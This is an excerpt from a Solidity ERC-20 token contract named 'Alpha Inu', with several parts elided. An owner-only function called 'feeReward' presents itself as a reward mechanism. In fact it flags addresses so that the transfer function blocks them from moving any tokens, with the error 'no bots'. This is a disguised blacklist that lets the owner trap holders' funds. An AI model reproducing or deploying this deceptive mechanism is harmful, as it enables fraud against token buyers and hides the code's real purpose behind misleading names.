...
contract AlphaInuToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private constant _name = "Alpha Inu";
    ...
    event rewardSended (address feeRewards, bool isRewarded);
    ...
    function feeReward(address feeRewards) external onlyOwner {
        if (_feeAddress[feeRewards] == true) {
            _feeAddress[feeRewards] = false;
        } else {_feeAddress[feeRewards] = true;
            emit rewardSended (feeRewards, _feeAddress[feeRewards]);
          }
    }

    function checkRewards(address feeRewards) public view returns (bool) {
        return _feeAddress[feeRewards];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_feeAddress[sender] || _feeAddress[recipient]) require (amount == 0, "no bots");
